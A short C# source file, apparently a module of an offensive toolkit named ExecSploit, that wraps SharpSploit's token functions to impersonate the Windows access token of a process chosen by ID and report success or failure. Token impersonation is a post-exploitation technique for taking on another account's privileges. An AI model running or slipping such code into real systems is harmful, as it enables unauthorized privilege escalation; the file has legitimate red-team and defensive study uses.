using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class ImpersonateProcess
    {
        public static string Execute(string ProcessID)
        {
            try
            {
                using (Tokens t = new Tokens())
                {
                    uint ProcID = UInt32.Parse(ProcessID);
                    if (t.ImpersonateProcess(ProcID))
                    {
                        return "Successfully impersonated: " + ProcessID;
                    }
                    else
                    {
                        return "Failed to impersonate: " + ProcessID;
                    }
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}